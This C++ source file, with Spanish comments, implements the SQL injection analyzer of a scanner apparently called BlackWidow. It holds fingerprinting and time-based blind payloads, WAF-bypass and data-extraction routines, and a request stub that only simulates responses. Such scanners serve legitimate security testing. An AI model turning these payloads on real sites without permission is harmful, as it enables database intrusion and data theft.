/**
 * SqlInjectionAnalyzer.cpp
 * Implementación de la clase para analizar vulnerabilidades de inyección SQL
 */

#include "SqlInjectionAnalyzer.h"
#include <regex>
#include <iostream>
#include <sstream>

namespace BlackWidow {
namespace Security {
namespace Analyzer {

SqlInjectionAnalyzer::SqlInjectionAnalyzer() {
    // Constructor por defecto
}

SqlInjectionAnalysisResult SqlInjectionAnalyzer::analyzeResponse(const std::string& response, 
                                                               const std::string& payload,
                                                               const std::string& originalInput) {
    SqlInjectionAnalysisResult result;
    
    // Verificar si hay errores de base de datos en la respuesta
    if (detectDatabaseErrors(response)) {
        result.vulnerable = true;
        result.vulnerabilityType = "Error-based SQL Injection";
        result.evidence = response;
        result.payload = payload;
        
        // Intentar determinar el tipo de base de datos por los mensajes de error
        if (response.find("MySQL") != std::string::npos || 
            response.find("You have an error in your SQL syntax") != std::string::npos) {
            result.databaseType = "MySQL";
        } else if (response.find("Microsoft SQL Server") != std::string::npos || 
                   response.find("Unclosed quotation mark") != std::string::npos) {
            result.databaseType = "MSSQL";
        } else if (response.find("ORA-") != std::string::npos) {
            result.databaseType = "Oracle";
        } else if (response.find("PostgreSQL") != std::string::npos || 
                   response.find("PSQLException") != std::string::npos) {
            result.databaseType = "PostgreSQL";
        } else if (response.find("SQLite") != std::string::npos) {
            result.databaseType = "SQLite";
        } else {
            result.databaseType = "Unknown";
        }
        
        // Extraer datos filtrados
        result.extractedData = extractLeakedData(response);
        
        // Determinar nivel de impacto
        result.impactLevel = determineImpactLevel(result.vulnerabilityType, result.databaseType);
    }
    
    return result;
}

SqlInjectionAnalysisResult SqlInjectionAnalyzer::detectVulnerability(const std::string& url, 
                                                                   const std::map<std::string, std::string>& params,
                                                                   const std::map<std::string, std::string>& headers) {
    SqlInjectionAnalysisResult result;
    
    // Obtener una respuesta base para comparación
    std::string baseResponse = sendSqlInjectionRequest(url, params, headers);
    
    // Obtener payloads básicos para pruebas
    std::vector<std::string> basicPayloads = Payloads::SqlInjectionPayloads::getBasicPayloads();
    
    // Probar cada parámetro con cada payload
    for (const auto& param : params) {
        std::map<std::string, std::string> testParams = params;
        std::string originalValue = param.second;
        
        for (const auto& payload : basicPayloads) {
            // Modificar el parámetro con el payload
            testParams[param.first] = originalValue + payload;
            
            // Enviar la petición
            std::string response = sendSqlInjectionRequest(url, testParams, headers);
            
            // Analizar la respuesta
            SqlInjectionAnalysisResult tempResult = analyzeResponse(response, payload, originalValue);
            
            if (tempResult.vulnerable) {
                return tempResult; // Retornar al primer indicio de vulnerabilidad
            }
            
            // Verificar cambios en la respuesta (para inyecciones que no generan errores)
            if (detectResponseChanges(baseResponse, response)) {
                tempResult.vulnerable = true;
                tempResult.vulnerabilityType = "Boolean-based SQL Injection";
                tempResult.evidence = response;
                tempResult.payload = payload;
                tempResult.impactLevel = 3; // Impacto medio
                return tempResult;
            }
        }
        
        // Si no se encontró vulnerabilidad con payloads básicos, probar con avanzados
        std::vector<std::string> advancedPayloads = Payloads::SqlInjectionPayloads::getAdvancedPayloads();
        
        for (const auto& payload : advancedPayloads) {
            // Modificar el parámetro con el payload
            testParams[param.first] = originalValue + payload;
            
            // Enviar la petición
            std::string response = sendSqlInjectionRequest(url, testParams, headers);
            
            // Analizar la respuesta
            SqlInjectionAnalysisResult tempResult = analyzeResponse(response, payload, originalValue);
            
            if (tempResult.vulnerable) {
                return tempResult;
            }
            
            // Verificar cambios en la respuesta
            if (detectResponseChanges(baseResponse, response)) {
                tempResult.vulnerable = true;
                tempResult.vulnerabilityType = "Boolean-based SQL Injection";
                tempResult.evidence = response;
                tempResult.payload = payload;
                tempResult.impactLevel = 4; // Impacto alto (payload avanzado)
                return tempResult;
            }
        }
        
        // Probar con payloads para evasión de WAF
        std::vector<std::string> wafBypassPayloads = Payloads::SqlInjectionPayloads::getWafBypassPayloads();
        
        for (const auto& payload : wafBypassPayloads) {
            // Modificar el parámetro con el payload
            testParams[param.first] = originalValue + payload;
            
            // Enviar la petición
            std::string response = sendSqlInjectionRequest(url, testParams, headers);
            
            // Analizar la respuesta
            SqlInjectionAnalysisResult tempResult = analyzeResponse(response, payload, originalValue);
            
            if (tempResult.vulnerable) {
                tempResult.vulnerabilityType = "WAF-bypass SQL Injection";
                tempResult.impactLevel = 5; // Impacto muy alto (bypass WAF)
                return tempResult;
            }
        }
    }
    
    return result; // No se encontró vulnerabilidad
}

Payloads::DatabaseType SqlInjectionAnalyzer::detectDatabaseType(const std::string& url,
                                                               const std::string& vulnerableParam,
                                                               const std::map<std::string, std::string>& headers) {
    // Crear un mapa con el parámetro vulnerable
    std::map<std::string, std::string> params;
    params[vulnerableParam] = "1";
    
    // Payloads específicos para detectar cada tipo de base de datos
    std::vector<std::pair<std::string, Payloads::DatabaseType>> dbDetectionPayloads = {
        {"' AND (SELECT 1 FROM dual) = '1", Payloads::DatabaseType::ORACLE},
        {"' AND @@version = '1", Payloads::DatabaseType::MYSQL},
        {"' AND @@SERVERNAME = '1", Payloads::DatabaseType::MSSQL},
        {"' AND version() = '1", Payloads::DatabaseType::POSTGRESQL},
        {"' AND sqlite_version() = '1", Payloads::DatabaseType::SQLITE}
    };
    
    for (const auto& dbPayload : dbDetectionPayloads) {
        params[vulnerableParam] = "1" + dbPayload.first;
        std::string response = sendSqlInjectionRequest(url, params, headers);
        
        // Si no hay error, es posible que hayamos identificado el tipo de base de datos
        if (!detectDatabaseErrors(response)) {
            return dbPayload.second;
        }
    }
    
    return Payloads::DatabaseType::GENERIC; // No se pudo determinar el tipo específico
}

SqlInjectionAnalysisResult SqlInjectionAnalyzer::extractDatabaseInfo(const std::string& url,
                                                                   const std::string& vulnerableParam,
                                                                   Payloads::DatabaseType dbType,
                                                                   const std::map<std::string, std::string>& headers) {
    SqlInjectionAnalysisResult result;
    result.vulnerable = true;
    result.databaseType = [&]() {
        switch (dbType) {
            case Payloads::DatabaseType::MYSQL: return "MySQL";
            case Payloads::DatabaseType::MSSQL: return "MSSQL";
            case Payloads::DatabaseType::ORACLE: return "Oracle";
            case Payloads::DatabaseType::POSTGRESQL: return "PostgreSQL";
            case Payloads::DatabaseType::SQLITE: return "SQLite";
            default: return "Generic";
        }
    }();
    
    // Obtener payloads específicos para extracción de datos
    std::vector<std::string> extractionPayloads = Payloads::SqlInjectionPayloads::getDataExtractionPayloads(dbType);
    
    // Crear un mapa con el parámetro vulnerable
    std::map<std::string, std::string> params;
    
    // Probar cada payload de extracción
    for (const auto& payload : extractionPayloads) {
        params[vulnerableParam] = "1" + payload;
        std::string response = sendSqlInjectionRequest(url, params, headers);
        
        // Extraer datos de la respuesta
        std::map<std::string, std::string> extractedData = extractLeakedData(response);
        
        // Añadir los datos extraídos al resultado
        for (const auto& data : extractedData) {
            result.extractedData[data.first] = data.second;
        }
    }
    
    result.vulnerabilityType = "Data Extraction SQL Injection";
    result.impactLevel = 5; // Impacto muy alto (extracción de datos)
    
    return result;
}

SqlInjectionAnalysisResult SqlInjectionAnalyzer::detectBlindInjection(const std::string& url, 
                                                                    const std::map<std::string, std::string>& params,
                                                                    const std::map<std::string, std::string>& headers) {
    SqlInjectionAnalysisResult result;
    
    // Obtener una respuesta base para comparación
    std::string baseResponse = sendSqlInjectionRequest(url, params, headers);
    
    // Probar cada parámetro con payloads para inyección ciega
    for (const auto& param : params) {
        std::map<std::string, std::string> testParams = params;
        std::string originalValue = param.second;
        
        // Probar con payloads para inyección ciega genéricos
        std::vector<std::string> blindPayloads = Payloads::SqlInjectionPayloads::getBlindInjectionPayloads(Payloads::DatabaseType::GENERIC);
        
        for (const auto& payload : blindPayloads) {
            // Probar con condición verdadera
            testParams[param.first] = originalValue + payload + " AND 1=1";
            std::string trueResponse = sendSqlInjectionRequest(url, testParams, headers);
            
            // Probar con condición falsa
            testParams[param.first] = originalValue + payload + " AND 1=2";
            std::string falseResponse = sendSqlInjectionRequest(url, testParams, headers);
            
            // Si hay diferencia entre las respuestas, es vulnerable a inyección ciega
            if (detectResponseChanges(trueResponse, falseResponse)) {
                result.vulnerable = true;
                result.vulnerabilityType = "Blind SQL Injection";
                result.evidence = "Diferencia detectada entre condición verdadera y falsa";
                result.payload = payload;
                result.impactLevel = 4; // Impacto alto
                
                // Intentar determinar el tipo de base de datos
                Payloads::DatabaseType dbType = detectDatabaseType(url, param.first, headers);
                result.databaseType = [&]() {
                    switch (dbType) {
                        case Payloads::DatabaseType::MYSQL: return "MySQL";
                        case Payloads::DatabaseType::MSSQL: return "MSSQL";
                        case Payloads::DatabaseType::ORACLE: return "Oracle";
                        case Payloads::DatabaseType::POSTGRESQL: return "PostgreSQL";
                        case Payloads::DatabaseType::SQLITE: return "SQLite";
                        default: return "Generic";
                    }
                }();
                
                return result;
            }
        }
        
        // Probar con time-based blind injection
        std::vector<std::string> timeBasedPayloads = {
            "' AND (SELECT SLEEP(1)) = '0",  // MySQL
            "' AND WAITFOR DELAY '0:0:1' = '0",  // MSSQL
            "' AND DBMS_LOCK.SLEEP(1) = '0",  // Oracle
            "' AND pg_sleep(1) = '0"  // PostgreSQL
        };
        
        for (const auto& payload : timeBasedPayloads) {
            // Medir tiempo de respuesta normal
            auto startNormal = std::chrono::high_resolution_clock::now();
            sendSqlInjectionRequest(url, params, headers);
            auto endNormal = std::chrono::high_resolution_clock::now();
            auto normalDuration = std::chrono::duration_cast<std::chrono::milliseconds>(endNormal - startNormal).count();
            
            // Medir tiempo con payload
            testParams[param.first] = originalValue + payload;
            auto startInjection = std::chrono::high_resolution_clock::now();
            std::string injectionResponse = sendSqlInjectionRequest(url, testParams, headers);
            auto endInjection = std::chrono::high_resolution_clock::now();
            auto injectionDuration = std::chrono::duration_cast<std::chrono::milliseconds>(endInjection - startInjection).count();
            
            // Si hay un retraso significativo, es vulnerable a time-based blind injection
            if (injectionDuration > normalDuration + 900) { // Al menos 900ms de diferencia
                result.vulnerable = true;
                result.vulnerabilityType = "Time-based Blind SQL Injection";
                result.evidence = "Retraso detectado en la respuesta";
                result.payload = payload;
                result.impactLevel = 4; // Impacto alto
                
                // Determinar tipo de base de datos por el payload
                if (payload.find("SLEEP") != std::string::npos) {
                    result.databaseType = "MySQL";
                } else if (payload.find("WAITFOR") != std::string::npos) {
                    result.databaseType = "MSSQL";
                } else if (payload.find("DBMS_LOCK") != std::string::npos) {
                    result.databaseType = "Oracle";
                } else if (payload.find("pg_sleep") != std::string::npos) {
                    result.databaseType = "PostgreSQL";
                } else {
                    result.databaseType = "Unknown";
                }
                
                return result;
            }
        }
    }
    
    return result; // No se encontró vulnerabilidad
}

std::string SqlInjectionAnalyzer::sendSqlInjectionRequest(const std::string& url, 
                                                        const std::map<std::string, std::string>& params,
                                                        const std::map<std::string, std::string>& headers) {
    // Nota: En una implementación real, aquí se enviaría una petición HTTP
    // con los parámetros al URL especificado. Para esta implementación,
    // simplemente devolvemos un placeholder.
    
    std::ostringstream responseStream;
    responseStream << "HTTP/1.1 200 OK\r\n";
    responseStream << "Content-Type: text/html\r\n\r\n";
    responseStream << "<!DOCTYPE html>\n<html>\n<head>\n<title>Database Results</title>\n</head>\n<body>\n";
    
    // Simular una respuesta basada en los parámetros
    for (const auto& param : params) {
        // Simular vulnerabilidad SQL para ciertos payloads
        if (param.second.find("'") != std::string::npos || 
            param.second.find("\"") != std::string::npos || 
            param.second.find("--") != std::string::npos || 
            param.second.find("#") != std::string::npos || 
            param.second.find(";") != std::string::npos) {
            
            // Simular error de base de datos
            if (param.second.find("AND 1=2") != std::string::npos) {
                // Simular respuesta para condición falsa (menos resultados)
                responseStream << "<div>No results found</div>\n";
            } else if (param.second.find("AND 1=1") != std::string::npos) {
                // Simular respuesta para condición verdadera (resultados normales)
                responseStream << "<div>Results for query: " << param.first << "</div>\n";
                responseStream << "<div>Item 1</div>\n";
                responseStream << "<div>Item 2</div>\n";
                responseStream << "<div>Item 3</div>\n";
            } else if (param.second.find("UNION SELECT") != std::string::npos) {
                // Simular respuesta para UNION SELECT
                responseStream << "<div>Results for query: " << param.first << "</div>\n";
                responseStream << "<div>Database: test_db</div>\n";
                responseStream << "<div>Version: 5.7.32</div>\n";
                responseStream << "<div>User: db_user</div>\n";
            } else if (param.second.find("SLEEP") != std::string::npos || 
                       param.second.find("WAITFOR") != std::string::npos || 
                       param.second.find("pg_sleep") != std::string::npos) {
                // Simular respuesta para time-based
                responseStream << "<div>Query executed</div>\n";
            } else {
                // Simular error genérico de SQL
                responseStream << "<div class='error'>Error in SQL syntax: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" << param.second << "' at line 1</div>\n";
            }
        } else {
            // Respuesta normal
            responseStream << "<div>Results for: " << param.first << " = " << param.second << "</div>\n";
            responseStream << "<div>Item 1</div>\n";
            responseStream << "<div>Item 2</div>\n";
            responseStream << "<div>Item 3</div>\n";
        }
    }
    
    responseStream << "</body>\n</html>";
    
    return responseStream.str();
}

bool SqlInjectionAnalyzer::detectDatabaseErrors(const std::string& response) {
    // Patrones de errores comunes de bases de datos
    std::vector<std::string> errorPatterns = {
        "SQL syntax",
        "MySQL",
        "ORA-",
        "Microsoft SQL Server",
        "PostgreSQL",
        "SQLite",
        "syntax error",
        "unclosed quotation mark",
        "unterminated string",
        "error in your SQL syntax",
        "unexpected end of SQL command",
        "ERROR:",
        "Warning:",
        "ODBC Driver",
        "DB2 SQL error",
        "Sybase message"
    };
    
    for (const auto& pattern : errorPatterns) {
        if (response.find(pattern) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

bool SqlInjectionAnalyzer::detectResponseChanges(const std::string& originalResponse, const std::string& injectedResponse) {
    // Verificar si hay cambios significativos en la respuesta
    
    // Verificar diferencia en longitud
    if (std::abs(static_cast<int>(originalResponse.length() - injectedResponse.length())) > 50) {
        return true;
    }
    
    // Verificar presencia/ausencia de ciertos patrones
    std::vector<std::string> significantPatterns = {
        "No results",
        "Error",
        "Exception",
        "<table>",
        "<tr>",
        "<div class='result'>"
    };
    
    for (const auto& pattern : significantPatterns) {
        bool inOriginal = originalResponse.find(pattern) != std::string::npos;
        bool inInjected = injectedResponse.find(pattern) != std::string::npos;
        
        if (inOriginal != inInjected) {
            return true;
        }
    }
    
    return false;
}

std::map<std::string, std::string> SqlInjectionAnalyzer::extractLeakedData(const std::string& response) {
    std::map<std::string, std::string> extractedData;
    
    // Patrones para extraer información filtrada
    std::vector<std::pair<std::string, std::string>> extractionPatterns = {
        {"Database: ([^<]+)", "database_name"},
        {"Version: ([^<]+)", "database_version"},
        {"User: ([^<]+)", "database_user"},
        {"([a-zA-Z0-9_-]+):([^<]+)", "table_data"},
        {"Error in SQL syntax: ([^<]+)", "sql_error"}
    };
    
    for (const auto& pattern : extractionPatterns) {
        std::regex regex(pattern.first);
        std::smatch matches;
        std::string::const_iterator searchStart(response.begin());
        
        while (std::regex_search(searchStart, response.end(), matches, regex)) {
            if (matches.size() > 1) {
                extractedData[pattern.second] = matches[1].str();
            }
            searchStart = matches.suffix().first;
        }
    }
    
    return extractedData;
}

int SqlInjectionAnalyzer::determineImpactLevel(const std::string& vulnerabilityType, const std::string& databaseType) {
    // Determinar el nivel de impacto basado en el tipo de vulnerabilidad y la base de datos
    
    int baseLevel = 3; // Impacto medio por defecto
    
    // Ajustar por tipo de vulnerabilidad
    if (vulnerabilityType == "Error-based SQL Injection") {
        baseLevel = 3; // Impacto medio
    } else if (vulnerabilityType == "Union-based SQL Injection") {
        baseLevel = 4; // Impacto alto
    } else if (vulnerabilityType == "Blind SQL Injection") {
        baseLevel = 3; // Impacto medio
    } else if (vulnerabilityType == "Time-based Blind SQL Injection") {
        baseLevel = 3; // Impacto medio
    } else if (vulnerabilityType == "Boolean-based SQL Injection") {
        baseLevel = 3; // Impacto medio
    } else if (vulnerabilityType == "Data Extraction SQL Injection") {
        baseLevel = 5; // Impacto muy alto
    } else if (vulnerabilityType == "WAF-bypass SQL Injection") {
        baseLevel = 5; // Impacto muy alto
    }
    
    // Ajustar por tipo de base de datos
    if (databaseType == "MySQL" || databaseType == "PostgreSQL" || databaseType == "SQLite") {
        // Mantener el nivel base
    } else if (databaseType == "MSSQL" || databaseType == "Oracle") {
        baseLevel += 1; // Mayor impacto en bases de datos empresariales
    }
    
    // Asegurar que el nivel esté entre 1 y 5
    if (baseLevel < 1) baseLevel = 1;
    if (baseLevel > 5) baseLevel = 5;
    
    return baseLevel;
}

} // namespace Analyzer
} // namespace Security
} // namespace BlackWidow